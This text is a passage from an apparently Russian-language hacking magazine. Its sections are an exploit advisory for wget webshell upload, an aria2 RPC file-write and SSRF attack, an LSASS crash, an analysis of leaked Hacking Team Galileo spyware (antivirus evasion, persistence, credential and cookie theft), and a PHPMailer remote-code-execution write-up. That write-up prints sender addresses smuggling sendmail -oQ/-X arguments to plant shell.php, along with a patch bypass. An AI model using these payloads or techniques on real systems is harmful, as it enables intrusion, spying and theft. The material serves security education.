   victimsvr - - [24/Nov/2016 00:46:18] "GET /webshell.php HTTP/1.1"
   200 -
[+] PHP webshell payload was sent.
[+} Sleep for 2s to make sure the file has been flushed to the disk
   on the target...
[+} File '/webshell.php' should be saved by now :)
[+} Executing /usr/bin/id via webshell URL: http://victimsvr/
   image_uploads/webshell.php?cmd=/usr/bin/id
[+} Command result: uid=33(www-data) gid=33(www-data) groups=
   33(www-data),1002(nagcmd)
[+} All done. Closing HTTP connection...

Оригинальный отчет доступен на сайте автора эксплоита.

TARGETS
GNU Wget версии младше 1.18.

SOLUTION
Производитель выпустил исправление.


ВЗЛОМ ARIA2 RPC-ДЕМОНА

 CVSSv2:     Нет
 Дата релиза: 21 ноября 2016 года
 Автор:       Риктер Чжэн (Ricter Zheng)
 CVE:         нет

Aria2 — это популярный консольный загрузчик файлов, который поддерживает
большое количество протоколов (HTTP, HTTPS, FTP, BitTorrent, Metalink). Aria2
RPC Server может принимать запросы из многих источников в обход различных
мер безопасности. К примеру, параметры --rpc-secret, --rpc-user, --rpc-
passwd могут быть взломаны с помощью социальной инженерии. А через aria2
RPC Server атакующий сможет провести SSRF, запись в произвольный файл
и другие атаки для получения привилегий на сервере.
   Aria2 имеет встроенный интерфейс XML-RPC и позволяет запустить
RPC-сервер. Для этого существует опция --enable-rpc.

EXPLOIT
ЗАПИСЬ В ПРОИЗВОЛЬНЫЙ ФАЙЛ
Контролируя ссылку для загрузки файла, путь сохранения файла и имя файла,
атакующий может произвести запись в произвольный файл. Остальные функции
aria2, такие как save-session, тоже могут с легкостью перезаписать произволь-
ный файл.

Обход --auto-file-renaming и --allow-overwrite
Согласно документации к aria2 RPC Server метод changeGlobalOption под-
держивает частичную модификацию глобальных настроек. Изменив параметры
allow-overwrite, атакующий способен обойти автоматическое переименова-
ние и записывать напрямую в специальный файл. Можно обойтись и без изме-
нения allow-overwrite, воспользовавшись специальным файлом session.

Перезапись .ssh/authorized_keys загружаемым файлом
Как тебе наверняка известно, UNIX-системы позволяют пользователям, которые
хранят свои ключи в специальном файле .ssh/authorized_keys, авторизовать-
ся в системе удаленно без пароля. Если атакующий сможет перезаписать этот
файл, то сможет и получить доступ к целевой системе.





                                        Пример подмены .ssh/authorized_keys

Перезапись .ssh/authorized_keys с помощью save-session
С помощью настройки save-session ты можешь указать, куда сохранять загру-
жаемый файл, когда aria2c закроется. Помимо этого, aria2 RPC Server поддер-
живает опцию user-agent, которую можно указать для загружаемого файла.
  Формат файла session для aria2:

http://download-server/1.txt
gid=79e8977d817e750e
dir=/home/bangumi/.aria2/
out=1.txt
allow-overwrite=true
user-agent=aria2/1.21.1

Aria2 не обрабатывает переводы строк \n, что дает возможность составить свой
user-agent и переделать session-файл, который выйдет за рамки скоупа. Так
как .ssh/authorized_keys довольно устойчив к ошибкам, то и изменить путь
в session на .ssh/authorized_keys не составит труда.





Aria2 закроется после завершения атаки, а файлы session сохранятся в специ-
альной директории.





                                Перезапись .ssh/authorized_keys с помощью session

Новая версия aria2 поддерживает метод aria2.saveSession, который можно
использовать в случае закрытия сессии aria2.





Перезапись файла настроек aria2
Aria2 поддерживает  настройку  --on-download-complete: можно  указать,
что за программа будет запущена после окончания загрузки. Ниже представле-
ны параметры запускаемой программы.

hook.sh $1      $2      $3
hook.sh GID     File No File path

Здесь GID — номер, который aria2 сгенерирует автоматически, а File No (номер
файла) всегда 1. Для опции --on-download-complete еще требуется указать
COMMAND и путь к исполняемому файлу. Для выполнения команды нам понадо-
бится найти COMMAND и выполнить файл, указанный в третьем параметре. К со-
жалению, ничего похожего на COMMAND в Linux не нашлось. Тем самым у нас
имеется два неконтролируемых и неизвестных аргумента; GID возвращается,
когда aria2 добавит задание, поэтому процесс выполнения команды становится
довольно хитрым.
   Для начала загружаем вредоносный конфигурационный файл aria2 и пере-
записываем оригинальный, затем ждем, пока aria2 перезагрузит его. Затем
грузим большой файл и сразу после паузы GID грузим маленький. Это позво-
лит сохранить имя файла и GID для большого. И наконец, открыв большой файл
для загрузки, сможем выполнять произвольные команды.





После завершения загрузки aria2 выполнит следующую команду:

/bin/bash GID 1 /path/to/file

Так как GID известен и файл называется GID, а путь основан на текущей директо-
рии, нам ничто не мешает успешно выполнить команды.





                                               Перезапись файла настроек aria2

SSRF
Сканирование сервиса Intranet HTTP
Так как у aria2 нет ограничений на загрузку файлов (адреса и прочее), то мы мо-
жем получить доступ к различным ресурсам через запросы aria2.





Используя код, указанный выше, можно просканировать ресурсы внутренней
сети.





                               Результаты сканирования внутренней сети через aria2

Атака на сервер Redis
Опция user-agent в aria2 допускает переносы строк (\n), поэтому можно прове-
сти атаку внутри сети на сервер Redis:





В случае успеха /root/.ssh/authorized_keys позволит залогиниться по SSH
без пароля.





                                            Успешная атака на Redis через aria2


Оригинальный пост, к сожалению, написан на китайском языке, но код говорит
сам за себя :-).

TARGETS
Aria2 < 1.29.0.

SOLUTION
Производитель выпустил исправление. Как вариант — можно запускать aria2c
от пользователя nobody, а также выключить следующие настройки CLI:

--rpc-listen-all
--allow-overwrite
--auto-file-renaming
--rpc-secret


УДАЛЕННОЕ ПОВРЕЖДЕНИЕ ПАМЯТИ В LSASS.EXE
(ПАТЧ WINDOWS НОМЕР MS16-137)
 CVSSv2
 Нет
 BRIEF
 *Дата релиза: 8 ноября 2016 года
 *Автор:     Лоран Гаффье (Laurent Gaffié)
 *CVE:        нет

Уязвимость в Windows Local Security Authority Subsystem Service (LSASS) была
обнаружена во всех версиях Windows, начиная с Windows XP и заканчивая
Windows 10. Она позволяет атакующему удаленно вызвать падение процесса
LSASS.EXE без взаимодействия с пользователем. В случае успешной эксплуа-
тации атакуемая машина будет перезагружена. Также возможно локальное по-
вышение привилегий.

EXPLOIT
Уязвимости подвержен как клиент LSASS, так и сервер. Ее можно вызывать
удаленно с помощью SMBv1 или SMBv2 в ходе передачи NTLM-сообщения 3
(Authenticate). Поступающие по SMB сообщения NTLM закодированы по прото-
колам ASN1 и DER. Это значит, что первое поле длины ASN может быть установ-
лено беззнаковым целым числом (0x84).
   Это позволяет атакующему удаленно выделить большой участок памяти
для сообщения, которое никогда не превышает 20 тысяч символов. Вторая
вещь, нужная для срабатывания уязвимости, — это задание длинного значения
(80–140 символов) любому строковому полю (User, Domain, session Key, MIC
и другие). Это приведет к падению LSASS.EXE.





Здесь видно, что функция LSASS NegpBuildMechListFromCreds отправляет null-у-
казатель creds в NTDLL RtlEnterCriticalSection, а RtlEnterCriticalSection
использует указатель null, что и вызывает падение.
   Протокол SMB непрост, так что советую изучить подробно PoC к этой уяз-
вимости, который автор опубликовал на своем GitHub. В PoC к тому же уже
встроена проверка уязвимости системы.
   Оригинальный пост ты можешь прочитать в блоге автора.

TARGETS
Windows XP / Server 2003, Windows Vista, Windows 7, Windows 2008R2, Windows
Server 2012R2, Windows 10 без обновления MS16-137.

SOLUTION
Производитель выпустил исправление.
ВЗЛОМ
В ЗАКРОМАХ
HACKING TEAM
   ИССЛЕДУЕМ ИСХОДНЫЕ КОДЫ
      ПЛАТФОРМЫ GALILEO





                           Денис Иванов            Андрей Федорченко
                                      @forreverse               fedorchenko@comsec.spb.ru





Прошел почти год с момента взлома компании Hacking
Team, специализирующейся на разработке шпионско-
го программного обеспечения для спецслужб со всего
мира. Самое интересное, что в Сеть утекли исходники их
платформы Galileo, но до сих пор не появилось более-ме-
нее подробного их обзора или анализа. Сегодня мы по-
стараемся исправить это упущение.

GALILEO В ТЕЛЕСКОПЕ
Не будем терять время на ненужные предисловия и сразу же перейдем к делу.
Вся платформа разбита на Git-репозитории c различным назначением и под
разные платформы: Windows, Linux, BlackBerry, Windows Mobile, iOS, macOS,
Android, но мы будем рассматривать только код под Windows и Linux. Сами мо-
дули, содержащиеся в репозиториях, можно поделить на несколько типов:
•  модули, названия которых начинаются с приставки vector-, предназначены
   для проникновения и закрепления в системе;
•  core- — собственно основное ядро платформы, отвечает за сбор и переда-
   чу «хозяину» необходимой информации.

Есть также несколько вспомогательных модулей, выносить их в отдельную ка-
тегорию не будем, но обязательно рассмотрим.
  В основном  вся платформа,  заточенная под  Windows, разработана
на C++ (небольшая часть на Python), Linux-код написан на C. Также есть код
и на Ruby — на нем разработана серверная часть продукта, мы же будем рас-
сматривать только клиентскую. Но давай уже перейдем к практической части
(«Меньше слов, покажите мне код» — Линус Торвальдс) и посмотрим, какие
приемы использовали парни из Италии, чтобы не засветиться на радарах и до-
ставить свое программное обеспечение до «клиентов».





                                                  Схема связей модулей Galileo


ПЫТАЕМСЯ ПРОНИКНУТЬ В СИСТЕМУ И ЗАКРЕПИТЬСЯ
Начнем с модуля vector-dropper. В принципе, внутри него все реализации
dropper’а под различные ОС, но нас будет интересовать только RCSDropper
под Windows (платформа под Linux полностью реализована в отдельном
Git-репозитории core-linux, все, что касается модулей под Linux, разберем чуть
позже).

RCSWin32Dropper
Этот модуль обеспечивает первоначальный этап заражения атакуемого объ-
екта: «размазывает» по файловой системе необходимые файлы, их расшиф-
ровывает, обеспечивает persistence и прочее. В коде присутствует очень мно-
го комментариев, название самих переменных, модулей, все сделано очень
удобно, много help-информации при работе с CLI — в общем, видно, что ре-
бята старались, делали продукт, удобный для заказчика. Все приведенные
вставки кода — это Copy-Paste из исходного кода, все комментарии разработ-
чиков тоже по возможности сохранены, для удобства некоторые переведены.
Для облегчения сборки контейнера, который потом будет доставляться на це-
левую машину, разработчики сделали полноценный CLI в двух модификациях.
Первый вариант сборки:





В данном случае <input> — чистый файлик, который перемешивается с «не-
обходимым» кодом, в нашем случае — <scout> (модуль «разведчик», опре-
деляет, находится ли семпл в песочнице, выявляет наличие антивирусных
средств), код данного модуля рассмотрим ниже. Итак, за «микс» между чи-
стым файлом и необходимой полезной нагрузкой отвечает код из MeltFile.
cpp, а именно функция MeltFile, она и инициализирует процесс скрещива-
ния двух файлов. Подробно на том, как она это делает, останавливаться не бу-
дем, но основная цель — подмена текущего, чистого EntryPoint на функцию
DropperEntryPoint из DropperCode.cpp (собственно, уже в этом коде и вы-
полняется вся магия по извлечению модулей, которая будет описана ниже).
   Второй экземпляр поставки отличается только тем, что он «запихивает»
в наш файл-контейнер все необходимые модули — ядро, драйвер, конфигура-
ционный файл и остальные:





DropperEntryPoint
На данном этапе стоит более подробно раскрыть работу DropperEntryPoint —
функции, которая будет распаковывать основные модули на целевую машину.
С самого начала кода можно увидеть обход эмулятора Avast, причем простым
циклом на уменьшение — наверное, просто тянут время, и таким образом AV
прекращает проверку эмулятором после 250–300 операций. В принципе, дан-
ная техника не нова:




После восстанавливаем стандартным способом Entry Point, через call  pop,
затем находим секцию внутри текущего модуля с пометкой <E> (чтобы обна-
ружить смещение в коде, откуда начинаются модули, которые будем распако-
вывать), причем ищем обычным перебором по байтам в виде ассемблерной
вставки:





Ассемблерная вставка используется с целью обхода Dr.Web, по крайней мере
так указано в комментариях: //  ***  Find  the  ending  marker  of  data
section <E> - ASM because of Dr.Web :).
  Следующим этапом будет восстановление собственной таблицы импорта:





Код у функций resolveLoadLibrary и resolveGetProcAddress почти иден-
тичный. Суть такая, что через PEB производится поиск сначала экспор-
та kernel32, а затем двух ее самых важных для малварщика функций:
GetProcAddress и LoadLibrary. Единственное, на что хочется обратить вни-
мание, — это строка:



Как видно из комментария, для обхода f-secure сравнение имени модуля
в списке PEB и строки с символами Kernel32.dll начинается со второго сим-
вола. После этого определяем, находится ли код под пристальным контролем
Microsoft Essential или нет:





Выделяем память на куче и кладем туда полный путь доступа к файлу, содер-
жащему указанный модуль, которым владеет текущий процесс. В результате
если это совпадает с Microsoft Security Client, то прекращаем выполне-
ние и переходим на оригинальный код нашего контейнера. В противном слу-
чае поочередно извлекаем все, что есть в контейнере.

РАСПАКОВКА
Так же как и вариантов упаковки, есть два варианта распаковки кода. В случае
упаковки с модулем разведки все модули, находящиеся в контейнере, зашиф-
рованы RC4 и упакованы APlib (библиотека для сжатия исполняемых файлов
для Microsoft Windows). В случае с модулем scout файл извлекается в директо-
рию %Autorun%, таким образом обеспечивая себе persistence.




Если модуля разведчика не было, то все файлы поочередно извлекаются в ди-
ректорию Temp/Microsoft. Вот кусок кода, который отвечает за извлечение
файлов:





РАЗВЕДАЕМ ОБСТАНОВКУ
Следующий модуль, который будем анализировать, — scout. В нем как раз
происходит вся магия, позволяющая определить, запущены ли мы в песочни-
це, есть ли поблизости приложения, которые не подходят по «политическим»
моментам, запущены ли мы в виртуализации и прочее. Начнем с функции
AntiVM() в antivm.cpp:





В ней как раз и стартует проверка наличия сред виртуализации и песочниц.
Начнем с детекта Cuckoo Sandbox, как наиболее интересного из всех методик
обхода. Метод основан на том, что при выполнении данного участка кода би-
блиотека cuckoomon.dll упадет:





Как обнаруживаются VMware и VirtualBox? Оба детекта почти идентичны: че-
рез язык запросов WMI запрашиваются значения некоторых параметров (ниже
указаны инициализации строк, которые будут проводить WMI-запрос). Напри-
мер, параметры BIOS, PnP, в случае с VirtualBox это:





При проверке на наличие VMware:





После от полученных путем WMI-запросов значений вычисляют хеши SHA-1
и сравнивают с предопределенными константами:





САМЫЙ ТИХИЙ МОДУЛЬ
Следующим  посмотрим  модуль  vector-silent. В общем  представлении
Vector-Silent — это модуль для скрытой установки полезной нагрузки в за-
раженную систему. В принципе, ничего особенного в нем нет, поэтому
внимание на нем заострять не будем. Анализ вектора начнем с функции
WinMain(). Суть работы модуля проста. Для начала восстанавливаем табли-
цу импорта стандартным для малварщиков способом — перебирая табли-
цы экспорта двух динамических библиотек: kernel32 и ntdll  . Набор дан-
ных функций не представляет собой ничего необычного: VirtualAlloc(),
VirtualFree(),   GetModuleFileNameA(),   GetEnviromentVariableA(),
GetFileAttributesA(),  CreatDirectoryA(),  SetCurrentDirectoryA(),
SetFileAttributesA(), CreateFileA(), GetLastError(), WriteFile(),
CloseHandle(),    FreeLibrary(),    DeleteFileA(),    swprintf(),
GetCurrentProcessId(), GetModuleHandle().
   Далее следует небольшой кусок кода с вызовом различных функций (по-
лучаем значения ключа реестра, текущую локаль, версию ОС и так далее),
но он не несет для авторов никакой полезной нагрузки и даже обрамлен ком-
ментариями типа // FAKE FAKE FAKE и // END FAKE FAKE FAKE — про-
сто способ запутать анализ. Основная полезная нагрузка модуля начинается
в функции DropperEntryPoint(). В самом начале работы проверяется кон-
троль Microsoft Essential для x86- и x64-разрядных систем. Для последнего
сравнение ведется по строке :\myapp.exe. При совпадении работа завер-
шается. Далее определяются пути к временным директориям из переменных
окружения (TMP или TEMP). По временной директории вычисляется ее роди-
тельская, и проверяется наличие в ней папки с именем Microsoft.
  Следующий участок кода функции — последовательный вызов функ-
ции dump_to_file(), которая записывает на диск основные функциональ-
ные модули: core, core64, config, driver, driver64, codec. По сути, функция
dump_to_file() всего лишь проверяет актуальность входных аргументов, по-
сле чего в случае успеха передает управление функции DumpFile(). В функ-
ции DumpFile() производится шифрование/расшифровка (алгоритм RC4,
ключ 256 бит) переданного в качестве аргумента тела файла и запись в ра-
бочую директорию. В завершение DropperEntryPoint() вызывается функ-
ция  CoreThreadProc(DropperHeader*).  Здесь  необходимо  упомянуть,
что в структуре DropperHeader:





присутствуют поля dllPath и eliteExports. Последнее содержит имена двух
функций (условные названия HFF5 и HFF8), которые экспортируют библиотеку
из dllPath. Сначала загружается модуль по расположению header->dllPath,
затем получается адрес функции HFF5 и вызывается со следующими аргумен-
тами:
•  (1) строка <%systemroot%\System32\rundll32.exe “<dllPath>”,<HFF8>>;
•  (2) NULL;
•  (3 и  4) пустые экземпляры структур типов STARTUPINFO и PROCESS_
   INFORMATION.

Таким образом запускаются основные модули.

ГЛАВНЫЙ БОЕЦ
Итак, перейдем к модулю soldier-win. Если бегло взглянуть на названия файлов
с исходниками (см. рис. 2), то можно и без их анализа сделать вывод, что код,
который в них написан, выполняет основную активность на зараженной маши-
не: скриншоты, камера, сбор информации о паролях в различных соцсерви-
сах, почтовых клиентах, есть даже код, который устанавливает местоположе-
ние по Wi-Fi.
  Начнем с модуля main.cpp, а в нем с функции int CALLBACK WinMain, ко-
торая является EP для графических Windows-приложений. Кода в этом моду-
ле хватит на целый номер журнала, но есть несколько интересных моментов,
на них и сконцентрируемся. Например, функция InitScout(). По названию
понятно, что она отвечает за инициализацию модуля. В первую очередь опре-
деляется «чистота» почвы, на которой модуль запускается. Делается это уже
известным нам способом — AntiVM(). Вообще, самое интересное в функции
InitScout() — это расшифровка конфига в LoadConf(). По-видимому, соз-
датели предполагали несколько способов хранения конфигов: в самом коде
и в ветке реестра. При этом использование ветки работает только в режиме
debug. Конфиг зашифрован на AES в режиме CBC. В нем, помимо сервера,
указаны основные цели, которые преследуют на текущей зараженной машине.
Для каждой из них создается отдельный поток. Например, сбор информации
о соцсервисах:



Сбор информации о соцсервисах работает следующим образом: первым де-
лом забираются все имеющиеся на машине файлы cookie из браузеров Firefox,
IE, Chrome. Первый и третий хранят cookie в базе данных SQLite, поэтому лег-
ко достать их обычным SQL-запросом:





При сборе кукисов из IE просто проходим по каталогу с интересующими нас
файлами и применяем к ним простенький парсер, получая необходимую инфу:





Далее собирается информация о геокоординатах. В данном случае исполь-
зуется несколько подходов. Первый — это сбор информации о ближайших
точках доступа Wi-Fi. Второе — сбор координат из постов новостной ленты
Facebook, а также из размещенных в соцсети фото.



                           Продолжение статьи
ВЗЛОМ


     Начало статьи
В ЗАКРОМАХ
HACKING TEAM
   ИССЛЕДУЕМ ИСХОДНЫЕ КОДЫ
      ПЛАТФОРМЫ GALILEO




А КАК ОБСТОЯТ ДЕЛА С LINUX?
Ну а теперь окунемся немного в мир Linux. В данном случае весь код написан
на С и структурно представляет собой почти полный аналог виндовой версии:
ядро системы, дроппер и парочка вспомогательных модулей.





                                                      Структура модулей для Linux

В первую очередь посмотрим код дроппера. В принципе, ничего специфиче-
ского в нем нет, и в самом начале исходного кода dropper.c авторы оставили
формат будущего агента:





Если сопоставить это со скриптом сборки build.php, то действительно под-
тверждается структура формата dropper’a:





Далее модуль установки всей полезной нагрузки, опрашивая различные пере-
менные окружения (SUDO_USER, USER, USER_NAME), определяет, запущен ли
он под рутом:



Соответственно, если это так, то структура passwd из pwd.h, предназначенная
для хранения информации о пользователе:





заполняется информацией, полученной из /etc/passwd; если агент запу-
щен не в режиме суперпользователя, то мы получаем его имя командой pp
= popen(SO"who -q", "r"), а вся остальная информация описанным выше
способом — через /etc/passwd. Далее полученная информация использует-
ся для смены текущего каталога на домашний каталог пользователя.
  Следующий этап — извлечение всей нагрузки на диск. Производится
за счет маркеров, тегов и размеров, которые добавлялись в агент через скрипт
сборки. При этом в качестве каталога установки выступает /var/crash/.
reports-%u-%s", uid, tag или /var/crash/.reports-%u-%s", uid, tag.
Конфигурационный файл пишется в .cache:





а ядро текущего агента по аналогичной схеме в .whoopsie-report. Для под-
держания живучести агента в системе проводится несколько операций, обе-
спечивающих его автозапуск:





А именно: в текущем каталоге
пользователя  в  подкаталоге
.config/autostart  создается
файл   .desktop   с   путем
до ядра. Ну и наконец, произ-
водится запуск ядра командой
execl.

Ядро для системы Linux
Уделим немного внимания ядру
Galileo для системы Linux. Крат-
ко рассмотрим инициализацию
ядра и более подробно пого-
ворим о модулях полезной на-
грузки.
   Итак, на этапе инициали-
зации первым делом опреде-
ляется  пользователь,  от  ко-
торого запущен процесс, имя
процесса, имя машины, про-
изводится инициализация не-
обходимых библиотек и пар-
сится конфигурационный файл
parseconfig(SO".cache"),        Перечисление имен модулей core Linux
при  этом  конфигурационный
файл зашифрован:



Сами ключи шифрования жестко прописаны в структуре params:





В коде видно, что все настройки модуль носит с собой, при этом они оформ-
лены в JSON-формате. Соответственно, их разбор оформлен в виде вызовов
стандартных функций для работы с JSON. В настройках указаны время и пери-
одичность запусков полезной нагрузки и, главное, набор этих самых полезных
нагрузок и параметры их запуска. Чтобы обеспечить скрытность получения ре-
зультатов работы, собранная информация с зараженной машины передается
в pipe и шифруется на AES-128-CBC, при этом ключ шифрования жестко ука-
зан в коде в поле структуры bps evidencekey.

ПОЛЕЗНЫЕ НАГРУЗКИ
Ну а теперь пробежимся по наиболее интересным модулям полезной нагрузки.
1. module_addressbook собирает информацию из адресной книги Skype, ко-
   торая хранится в SQLite3 базе данных:



После запросов к БД:



и





из которого видна получаемая информация.
2. module_application получает список всех запущенных процессов в систе-
  ме с их параметрами через чтение /proc/[number]/cmdline.
3. module_call получает список всех совершенных звонков в Skype. Все так
   же, как и в прошлый раз, — через чтение БД Skype-запросом:





4. module_camera — из названия все понятно, видео получаем через устрой-
   ство /dev/video0, пользуясь библиотекой libv4l2 — video for Linux.
5. module_chat — получаем список и, в принципе, всю переписку Skype, также
   через SQLite и select к ней:





6. module_device — узнаем конфигурацию зараженной машины: характери-
   стики процессора, свободное место на жестком диске, установленную опе-
   рационную систему, подключенные устройства, просто читая различные
   файлы: /etc/os-release, /etc/lsb-release, /proc/meminfo, /proc/
   cpuinfo и так далее.
7. module_messages — получаем список и содержимое всей почтовой пере-
   писки в почтовом клиенте Thunderbird. Ищем все файлики в ОС, связанные
   с клиентом, и парсим их, добывая интересную информацию.
8. module_mic — производит запись звука и его дальнейшее сжатие библио-
   теками speex и pulse.
9. module_money — собирает Bitcoin-кошельки на зараженной машине:





10. module_screenshot — делает скриншоты экрана через библиотеку x11
   и jpeglib.
11. module_position — конечно, текущие координаты не получает, но собира-
   ет информацию о подключенной точке доступа Wi-Fi и Wi-Fi-адаптере.
12. module_keylog получает информацию о нажатых клавишах клавиатуры.
13. module_url собирает информацию обо всех посещениях в браузерах:
   Chrome, Firefox, Opera, Web GNOME. В принципе, в его работе ничего не-
   обычного нет, просто большинство браузеров хранят информацию о посе-
   щениях в SQLite-базах:
   • Firefox — ~/.mozilla/{firefox,icecat}/*/places.sqlite;
   • Chrome — ~/.config/{google-chrome,chromium}/*/History;
   • Web GNOME — ~/.gnome2/epiphany/ephy-history.db;
   • единственный браузер Opera хранит историю в обычном файле ~/.opera/
    global_history.dat, который просто парсится.
14. module_mouse собирает информацию о нажатии мышкой с координатами
   нажатия и окном, в котором это нажатие сделано.
15. module_password добывает информацию о логинах-паролях в браузерах
   (поддержка Firefox и Chrome реализована, а вот Opera и Web GNOME на тот
   момент еще нет) и почтовом клиенте Thunderbird. Для хранения учетных дан-
   ных в Firefox и Thunderbird используется SQLite3 база данных, то есть дела-
   ется очередной запрос:




Далее полученные данные необходимо расшифровать. Тут на помощь при-
ходит Network Security Services (NSS) — набор библиотек, предназначенных
для разработки защищенных кросс-платформенных клиентских и сервер-
ных приложений. В его состав входит функция PK11SDR_Decrypt  (SECItem
*data, SECItem *result, void *cx), позволяющая расшифровывать блок
данных, подготовленных PK11SDR_Encrypt, которая и поможет расшифровать
учетные данные. А что делать с Chrome? Здесь используется GNOME-keyring,
предназначенный для безопасного хранения информации — имен пользо-
вателей и паролей. Соответственно, вызвав набор определенных методов,
можно получить необходимые учетные данные (расписывать методы не имеет
смысла, это можно посмотреть в коде).

ЗАКЛЮЧЕНИЕ
Рассказ можно продолжать и продолжать, но, к сожалению, даже электронный
формат статьи не позволит нам впихнуть всю информацию в разумный объем.
Поэтому, чтобы не получился очередной конкурент «Войны и мира», на этом
мы закончим. Для тех, кому интересно более глубоко окунуться в творение
Hacking Team, приводим ссылочку на репозиторий GitHub: Hacked Team.
  Но даже из того материала, который здесь описан, понятно, что Galileo — пол-
ноценный коммерческий продукт для слежки за пользователями, работающий
на большинстве операционных систем. К сожалению (а для нас — к счастью), раз-
работчикам платформы не повезло, и все сорцы утекли в Сеть. Ну а нам было бы
грех не воспользоваться таким шансом и не покопаться в коде :).
ВЗЛОМ
 ПИСЬМА
С СЮРПРИЗОМ
 ЭКСПЛУАТИРУЕМ УЯЗВИМОСТЬ В PHPMAILER
И ФРЕЙМВОРКАХ, КОТОРЫЕ ЕГО ИСПОЛЬЗУЮТ





                     aLLy, ONsec,
                       @iamsecurity





Сегодня мы рассмотрим уязвимость в библиотеке
PHPMailer, которая используется для отправки писем
миллионами разработчиков по всему миру. Этот скрипт
задействован в таких продуктах, как WordPress, Zend
Framework, Laravel, Yii 2 и других CMS, написанных на PHP.
Кроме того, ты можешь встретить его в каждой третьей
форме обратной связи.

О проблеме сообщил Давид Голунский — специалист по безопасности родом
из Польши. 25 декабря 2016 года он на своем сайте опубликовал документ,
в котором рассказал о проблемах в текущей версии PHPMailer. А вскоре подо-
спел и proof of concept.
   Уязвимость имеет статус критической потому, что позволяет удаленно вы-
полнять команды и читать файлы на целевой системе. В этой статье я рассмо-
трю баг в самой библиотеке, нескольких уязвимых продуктах, а также обход
неудачной попытки патча.

ДЕТАЛИ
Для начала взглянем на патч, который латает эту уязвимость. Идем на GitHub
и смотрим соответствующий коммит.
  В некоторых местах скрипта появилась дополнительная фильтрация пере-
менной $this->Sender. Это параметр, в котором находится адрес отправите-
ля сообщения (From: ded@moroz.com). Давай посмотрим, что с ним не так.
   PHPMailer по умолчанию использует стандартную функцию mail() для от-
правки сообщений. Выглядит это следующим образом:
class.phpmailer.php:





class.phpmailer.php:





Как видишь, mail() вызывается с пятью параметрами. Скрипт же собирает эти
параметры в $params, в том числе и адрес отправителя Sender (строки 1444–
1446). Если заглянуть в документацию PHP, то можно увидеть, что последний
параметр функции отвечает за дополнительные ключи, которые передаются
бинарнику sendmail на этапе отправки сообщения.
  Ты уже слышал про RCE через mail() с пятью параметрами? Если нет,
то вот кратко суть.
   Приложение sendmail имеет множество опций запуска, среди них есть не-
сколько интересных:
•  -Ooption=value устанавливает указанные настройки;
•  -OQueueDirectory=queuedir указывает путь, где будут храниться письма,
   поставленные в очередь для отправки;
•  -oQ — короткая версия предыдущего ключа;
•  -Cfile позволяет указать путь к конфигурационному файлу;
•  -Xlogfile позволяет логировать все этапы отправки сообщений в указан-
  ный файл. Очень полезно для отладки, а также для заливки шеллов ;).

Если использовать эти ключи в правильной комбинации, можно записать файл
с любым содержимым. Тебе пригодятся ключи -oQ и -X.
   Собственно, функция mail() как раз и занимается тем, что выполняет ко-
манду sendmail с нужными параметрами, которые в нашем случае поступают
к ней от PHPMailer. Если интересны детали, смотри на небольшой кусок кода
из исходников PHP.
/php/php-src/master/ext/standard/mail.c:



Вооружаемся  отладчиком,  чтобы  быстро  посмотреть,  какие  параметры
принимает бинарник. Если выполнить php   -r   'mail("pes@localhost",
"CheckOneTwo",  "Hello!",  "",  "-OQueueDirectory=/tmp  -X/var/www/
html/shell.php");', то sendmail_path будет выглядеть следующим образом.





                                                        Отладка функции mail()

gdb-peda$ print sendmail_cmd
$1 = 0xb7494a40 "/usr/sbin/sendmail -t -i  -OQueueDirectory=/tmp
    -X/var/www/html/shell.php"

Результатом выполнения, как ты уже успел догадаться, будет файл /var/www/
html/shell.php. Заметь, что можно контролировать его содержимое с помо-
щью заголовков письма: адресат, тема и текст сообщения.





                                    Содержимое созданного через -X лог-файла

Возвращаемся к насущным проблемам. Притворимся на время разработчика-
ми на PHP и возьмем готовый скрипт mail.phps из папки examples самой библи-
отеки. Теперь создадим простейшую форму обратной связи. К слову, большая
их часть именно так и делается.
examples/mail.phps:




form.html:





После отправки формы функция setFrom() создает переменную $this-
>Sender, которая содержит адрес отправителя и попадает в командную строку
в виде параметра -f (заголовок From в письме).
class.phpmailer.php:




class.phpmailer.php:





Адрес перед этим проходит валидацию (строка 1017), поэтому нельзя просто
взять и передать параметры для заливки шелла — получишь invalid_address
(строка 1019). Если, к примеру, попробовать адрес Test  -oQ/tmp  -X/var/
www/html/shell.php@givemeshell.com, то это он вызовет ошибку валидации.
   Если в двух словах, то тут проводится проверка на соответствие стандарту
RFC 3696. Однако Голунский выяснил, что согласно стандарту адреса с про-
белами считаются валидными только в том случае, если они окружены кавыч-
ками. Например, " email with spaces "@itsok.com.
  Делаем вторую попытку. Пробуем передать "Test -oQ/tmp -X/var/www/
html/shell.php"@givemeshell.com. На этот раз валидация пройдена, но ко-
манда для запуска почтового демона выглядит не совсем так, как нам нужно.
   Вся строка в конце считается частью аргумента -f. Чтобы избежать это-
го, нужно разбить его на части. К счастью, стандарт разрешает использовать
обратные слеши в адресе, поэтому воспользуемся эскейп-последовательно-
стью \" и отправим "Test\" -oQ/tmp/ -X/var/www/html/shell.php  any"@
givemeshell.com.





                                         Эксплоит успешно отработал, файл создан

На этот раз все проходит удачно. Как видишь, дополнительно в качестве тек-
ста сообщения я отправил код на PHP, который был успешно записан в файл
и прекрасно выполняется.





                                                        Результат работы эксплоита

Теперь мы получили возможность создавать файлы на целевой системе с про-
извольным содержимым. Миссия выполнена.

ПАТЧ И ЕГО ОБХОД
Разумеется, команда разработчиков PHPMailer поспешила выпустить патч
и настоятельно рекомендовала всем обновить библиотеку до версии 5.2.18.
Однако Голунский тоже быстро среагировал и буквально в день выхода фикса
зарелизил его обход.
   Снова идем на GitHub и ищем коммит с патчем. Ребята добавили код, кото-
рый проверяет, правильно ли экранируется параметр Sender. Если нет, то па-
раметр -f вообще не используется. Казалось бы, срубили всё на корню.
   Почему же не хватило фильтрации функцией escapeshellarg()? Дело в осо-
бенностях обработки передаваемых аргументов. Советую прочитать про об-
ход escapeshellarg, если ты еще не в курсе этих дел.
  Попробуем отправить предыдущий эксплоит и посмотрим, что будет.





                                            Патч экранирует значение параметра

Теперь вся переданная строка заключена в одинарные кавычки и воспринима-
ется демоном sendmail как хидер From. Но стоит только лишь заменить Test\"
на Test\', как все вернется на старые рельсы и эксплоит вновь заработает.





                                                    Успешный обход патча

ДРУГИЕ ФЛАГИ
Как ты помнишь, в начале статьи я упоминал флаг -C как потенциально инте-
ресный. Так вот, с его помощью ты можешь читать файлы на сервере. Этот
параметр используется для указания кастомного конфигурационного файла.
Естественно, конфиг должен иметь нужную структуру, а если она отсутству-
ет, то будут возвращаться ошибки вида 31337 >>> /path/to/file/file.ext:
line 2: unknown configuration line "Текст строки".
